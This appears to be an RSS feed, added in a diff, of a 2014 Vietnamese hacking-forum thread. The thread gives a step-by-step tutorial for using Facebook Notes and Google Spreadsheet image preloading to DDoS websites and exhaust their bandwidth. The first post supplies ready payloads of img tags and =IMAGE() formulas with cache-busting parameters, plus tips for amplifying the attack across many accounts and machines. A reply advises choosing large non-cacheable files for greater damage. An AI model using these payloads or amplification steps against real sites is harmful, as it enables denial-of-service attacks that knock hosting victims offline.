@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Script Kidy-Tut: DDoS và Chiếm dụng băng thông bằng Facebook Notes"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Script Kidy-Tut: DDoS và Chiếm dụng băng thông bằng Facebook Notes"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Script Kidy-Tut: DDoS và Chiếm dụng băng thông bằng Facebook Notes</title>
+				<description><![CDATA[ <b><font size='+1'><font color='orange'>DDoS và Chiếm dụng băng thông bằng Facebook Notes và Google SpreadSheet</font></font></b>
+
+[img]http://2.bp.blogspot.com/-wcJFLecPWPE/U1wtPtybDsI/AAAAAAAAAVw/6m0530-T7YA/s1600/Screen+Shot+2014-04-27+at+3.24.19+AM.png[/img]
+
+Các cơ chế proxy preload của các Mạng XH ( vd: Facebook ) và các Cloud Application ( vd: Google Docs ) tiềm tàng một nguy cơ là có thể bị &quot;mượn tay&quot; để tấn công DDoS hoặc tấn công chiếm băng thông
+
+Qua thử nghiệm các Vul này trên Facebook thì trong 2 phút, nó nuốt trôi hơn 8GB băng thông
+Nếu kết hợp cùng lúc nhiều account, nhiều dịch vụ cloud khác nhau ( có hỗ trợ proxy preload ) thì khả năng nạn nhân bị DoS và bị disable dịch vụ hosting vì hết băng thông rất cao
+
+Nguy hiểm cái là các bug này đều được báo cáo rồi nhưng cả mấy thằng to như Facebook, Google đều bảo là &quot;đây là tính năng ếu phải bug&quot; nên không sửa ( chắc cũng hơn 1 năm rồi )
+
+
+<b>
+Cách thực hiện thử nghiệm:
+</b>
+<b>Cần có:</b>
+
+    Mua một VPS làm nạn nhân thử nghiệm
+    VPS cài iftop hoặc bất kỳ công cụ nào để xem băng thông bị chiếm dụng
+    Upload một file bất kỳ có kích thước &gt; 10MB lên VPS. vd: testdos.pdf . Ghi lại URL tới file này ( vd:<span class="link"> http://xnohat.com/share/testdos.pdf</span> )
+
+
+
+<b>Thực hiện tấn công với Facebook Notes:</b>
+Tạo một account Facebook bất kỳ, tạo Facebook Note với nội dung, chứa khoảng 1000 dòng như sau 
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&lt;img src='http://xnohat.com/share/testdos.pdf?r=1'/&gt;
+&lt;img src='http://xnohat.com/share/testdos.pdf?r=2'/&gt;
+&lt;img src='http://xnohat.com/share/testdos.pdf?r=3'/&gt;
+&lt;img src='http://xnohat.com/share/testdos.pdf?r=4'/&gt;
+&lt;img src='http://xnohat.com/share/testdos.pdf?r=5'/&gt;</pre>
+		</div>
+
+Chú ý sẽ thấy sau mỗi url sẽ có thêm một biến số bất kỳ với giá trị tăng dần, đây là chỗ làm tăng tốc và mức độ nguy hại của phương thức DoS này ( giải thích cặn kẽ thì tham khảo link đính kèm cuối bài ).
+Mỗi dòng khi load lên sẽ gửi một request tới nạn nhân, 1000 dòng tương đường với 1000 request download file PDF 10MB như trên, tương đương 10GB băng thông bị ngốn
+[img]http://2.bp.blogspot.com/-51qjXlY-Z24/U1wphr6fE1I/AAAAAAAAAVg/X-rMIxFxF04/s1600/Screen+Shot+2014-04-27+at+3.05.28+AM.png[/img]
+
+<b>Thực hiện tấn công với Google Docs:</b>
+
+Tạo một file Google Docs Spreadsheet với 1000 dòng nội dung, mỗi dòng có nội dung tương tự như sau:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>=IMAGE&#40;http://xnohat.com/share/testdos.pdf?r=1&#41;
+=IMAGE&#40;http://xnohat.com/share/testdos.pdf?r=2&#41;
+=IMAGE&#40;http://xnohat.com/share/testdos.pdf?r=3&#41;
+=IMAGE&#40;http://xnohat.com/share/testdos.pdf?r=4&#41;
+=IMAGE&#40;http://xnohat.com/share/testdos.pdf?r=5&#41;</pre>
+		</div>
+
+ Chú ý sẽ thấy sau mỗi url sẽ có thêm một biến số bất kỳ với giá trị tăng dần, đây là chỗ làm tăng tốc và mức độ nguy hại của phương thức DoS này ( giải thích cặn kẽ thì tham khảo link đính kèm cuối bài ).
+Mỗi dòng khi load lên sẽ gửi một request tới nạn nhân, 1000 dòng tương đường với 1000 request download file PDF 10MB như trên, tương đương 10GB băng thông bị ngốn
+[img]http://1.bp.blogspot.com/-J1SwF9aVvy0/U1wsb29sFhI/AAAAAAAAAVs/E-0WtQ6vv1g/s1600/Screen+Shot+2014-04-27+at+2.53.06+AM.png[/img]
+
+
+<b>Cách thức tăng mức độ nguy hại của kiểu tấn công này:</b>
+- Phối hợp giữa Facebook Notes DDoS và Google Spreadsheet DDoS
+- Refresh liên tục các trang notes và các trang spreadsheet
+- Dùng nhiều account để mở nhiều  trang notes và các trang spreadsheet
+- Dùng nhiều máy tính + nhiều account để mở nhiều  trang notes và các trang spreadsheet
+
+Với cách thức DDoS này thì băng thông tối đa có thể DDoS được lên đến 800Mbps. Và lưu lượng băng thông bị ngốn là rất lớn. Nếu gặp các dịch vụ hosting có giới hạng băng thông tối đa hàng tháng thì nạn nhân nhanh chóng bị ISP ngưng dịch vụ vì hết bandwidth limit của tháng
+<b>
+xnohat</b>
+<i>
+<b>Tham khảo thêm:</b></i><span class="link"> http://thehackernews.com/2014/04/vulnerability-allows-anyone-to-ddos.html</span><span class="link"> http://chr13.com/2014/04/20/using-facebook-notes-to-ddos-any-website/</span><span class="link"> http://chr13.com/2014/03/10/using-google-to-ddos-any-website/</span>
+
+<i>Điều khoản miễn trừ: chúng tôi không chịu trách nhiệm đối với bất kỳ hành động nào của bất kỳ ai khi sử dụng các kiến thức được cung cấp trong bài viết này cho mục đích sai trái. Nếu bạn vi phạm pháp luật, bạn sẽ phải tự chịu trách nhiệm</i>
+
+P.s: cái BBCode IMG của HVA hết chạy rồi :(
+Coi bản formatted tại đây<span class="link"> http://www.scriptkidy.com/2014/04/ddos-va-chiem-dung-bang-thong-bang.html</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45603.hva#280466</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45603.hva#280466</link>
+				<pubDate><![CDATA[Sat, 26 Apr 2014 18:24:56]]> GMT</pubDate>
+				<author><![CDATA[ xnohat]]></author>
+			</item>
+			<item>
+				<title>Script Kidy-Tut: DDoS và Chiếm dụng băng thông bằng Facebook Notes</title>
+				<description><![CDATA[ Đây là video cho mấy bạn thích S-T-S:
+https://www.youtube.com/watch?v=yOgbJNX_CX4
+
+Lưu ý thêm: muốn DDos hiệu quả các bạn nên chọn những file download nặng lưu trên sever như: PDF, PPT, vvv...  và tránh những thứ có thể lưu trong cache bộ nhớ trình duyệt như image./.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45603.hva#280467</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/45603.hva#280467</link>
+				<pubDate><![CDATA[Sat, 26 Apr 2014 21:24:10]]> GMT</pubDate>
+				<author><![CDATA[ hackerngheo]]></author>
+			</item>
+	</channel>
+</rss>
